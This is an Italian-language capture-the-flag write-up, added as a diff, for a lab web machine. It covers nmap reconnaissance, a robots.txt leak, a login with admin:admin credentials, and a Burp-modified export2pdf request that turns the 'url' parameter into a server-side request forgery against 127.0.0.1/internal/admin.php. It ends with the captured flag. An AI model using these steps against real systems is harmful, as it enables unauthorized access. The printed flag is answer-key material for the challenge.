@@ -1,0 +1,84 @@
+//Contenuto macchina: Ricordati dell'uso di dirb, oppure semplicemente ricordati di cercare robots.txt 
+//		      Capire l'uso degli "strumenti" dati dalla macchina (e.g. l'ExportToPDF)
+
+### INFORMATION GATHERING ###
+╰─ nmap -Pn -A 10.10.76.42 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-24 18:52 CEST
+Nmap scan report for 10.10.76.42
+Host is up (0.054s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 df:06:2a:a1:c1:7d:ce:7f:1f:5c:8d:31:3d:15:d7:7c (RSA)
+|   256 05:62:d0:ea:8d:7c:2c:df:38:15:95:a6:5a:b0:e0:3f (ECDSA)
+|_  256 45:72:e8:b8:4c:03:50:13:3d:00:58:f0:81:13:07:a5 (ED25519)
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+| http-robots.txt: 1 disallowed entry 
+|_/backup/chat.txt
+| http-title: 24X7 System+
+|_Requested resource was /login.php
+|_http-server-header: Apache/2.4.38 (Debian)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.87 seconds
+     
+andando su http://10.10.76.42/ vengo redirectato su una pagina di login => http://10.10.76.42/login.php => mi servono username e password   
+                                            
+come al solito facendo la classica ricerca di mettere /robots.txt, => http://10.10.76.42/robots.txt <-- nel caso non sapessi dell'esistenza di questo file, potevo provare a fare una scansione con gobuster includendo il flag -x txt
+(tra l'altro per cercare il file è più comodo a parer mio usare dirb => dirb <IP> e lo trova)
+trovo:
+User-Agent: *
+Disallow: /backup/chat.txt <-- ci vado => http://10.10.76.42/backup/chat.txt
+trovo:
+Admin: I have finished setting up the new export2pdf tool. <-- parlano di un tool per fare conversione in formato PDF
+Kate: Thanks, we will require daily system reports in pdf format.
+Admin: Yes, I am updated about that.
+Kate: Have you finished adding the internal server.
+Admin: Yes, it should be serving flag from now.
+Kate: Also Don't forget to change the creds, plz stop using your username as password. <--- username e password sono uguali => visto che il messaggio lo ha inviato kate ad admin, provo con i classici admin:admin
+Kate: Hello.. ?
+
+quindi andando su http://10.10.76.42/login.php e mettendo admin:admin accedo :D
+
+vedo inoltre che in basso ho il tool di cui stavano parlando sopra, cliccando su "export to pdf" vedo che mi esporta i parametri del server che ho sopra e l'url diventa: http://10.10.76.42/export2pdf.php
+e vedo che il titolo è: Report generated for http://127.0.0.1/server-info.php
+quindi provo ad accedere a http://10.10.76.42/server-info.php e mi va sulle stesse info che ho avuto cliccando su "export to pdf", ma nulla di che
+
+inoltre sulla destra della dashboard dell'admin ho il messaggio "Internal pages hosted at /internal/admin.php. It contains the system flag." ed andando su http://10.10.76.42/internal/admin.php
+mi viene detto: This page can only be accessed locally.
+
+=> provo a vedere facendo una scansione con gobuster includendo il flag -x php
+╰─ gobuster dir -u http://10.10.76.42 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php => NON PORTA A NULLA
+
+quindi intercettando la richiesta con burp, ottengo:
+
+POST /export2pdf.php HTTP/1.1
+Host: 10.10.76.42
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 44
+Origin: http://10.10.76.42
+Connection: close
+Referer: http://10.10.76.42/index.php
+Cookie: PHPSESSID=c6c68288862fa5224460c630b31f86e7
+Upgrade-Insecure-Requests: 1
+
+url=http%3A%2F%2F127.0.0.1%2Fserver-info.php  <-- quindi devo cambiare qui e sapendo da prima che "Internal pages hosted at /internal/admin.php. It contains the system flag."
+=> vado a modificare in modo da far sì che ci stampi nel PDF il contenuto del file /internal/admin.php
+
+=> diventa url=http%3A%2F%2F127.0.0.1%2Finternal%2Fadmin.php  (<- %2F capisco che è lo / (potevo anche scriverlo normale e poi codificarlo, ma è abbastanza logico specialmente se si fa il procedimento inverso, cioè 
+dall'url iniziale, url=http%3A%2F%2F127.0.0.1%2Fserver-info.php, lo decodifico)
+
+comunque, apporto questa modifica rimanendo nella sezione "Proxy">"Intercept" poi premo forward e mi esce:
+
+Report generated for http://127.0.0.1/internal/admin.php
+flag{6255c55660e292cf0116c053c9937810} <-- LA FLAG :D
